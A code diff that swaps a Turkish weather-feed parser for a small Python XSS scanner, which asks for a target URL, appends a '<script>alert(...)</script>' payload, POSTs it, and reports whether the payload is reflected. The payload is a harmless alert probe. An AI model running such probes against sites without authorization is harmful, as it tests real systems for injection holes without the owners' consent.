@@ -1,9 +1,20 @@
-import feedparser
-url2=("https://www.mgm.gov.tr/FTPDATA/analiz/sonSOA.xml")
-hava=feedparser.parse(url2)
-i=0
-for x in hava.entries:
-    i+=1
-    print(i,".hava")
-    print(x.GenelDurum)
-    print(x.title)
+import requests
+print("""
+______________________________________________________________________________
+
+██╗  ██╗██╗  ██╗██╗    ██╗██╗  ██╗     ██████╗ ███████╗ ██████╗██╗  ██╗
+██║  ██║██║  ██║██║    ██║██║ ██╔╝    ██╔═══██╗██╔════╝██╔════╝╚██╗██╔╝
+███████║███████║██║ █╗ ██║█████╔╝     ██║   ██║█████╗  ██║      ╚███╔╝
+██╔══██║╚════██║██║███╗██║██╔═██╗     ██║   ██║██╔══╝  ██║      ██╔██╗
+██║  ██║     ██║╚███╔███╔╝██║  ██╗    ╚██████╔╝██║     ╚██████╗██╔╝ ██╗
+╚═╝  ╚═╝     ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝     ╚═════╝ ╚═╝      ╚═════╝╚═╝  ╚═╝
+______________________________________________________________________________
+                                                                       """)
+target = input("Hedef URL : ")
+payload = ("<script>alert(123123);</script>")
+req = requests.post(target + payload)
+if payload in req.text:
+    print ("XSS Açığı keşfetildi...")
+    print ("Saldırı Yükü: "+payload)
+else:
+    print ("Güvenli ")
